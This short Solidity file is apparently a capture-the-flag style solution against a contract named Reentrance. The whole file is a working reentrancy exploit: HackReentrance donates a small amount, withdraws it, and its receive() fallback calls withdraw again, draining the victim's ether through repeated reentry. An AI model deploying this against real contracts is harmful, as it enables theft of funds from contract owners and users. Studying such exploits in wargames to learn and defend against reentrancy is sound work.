// SPDX-License-Identifier: MIT

pragma solidity ^0.7;

interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract HackReentrance {

    Reentrance public victim;

    uint dividend;
    constructor (address payable _entrance) {
        victim = Reentrance(_entrance);
    }

    function exploitA() public payable {
        victim.donate{value: 0.001 ether}(address(this));
        victim.withdraw(0.001 ether);
    }

    receive() payable external {
        victim.withdraw(0.001 ether);
    }
}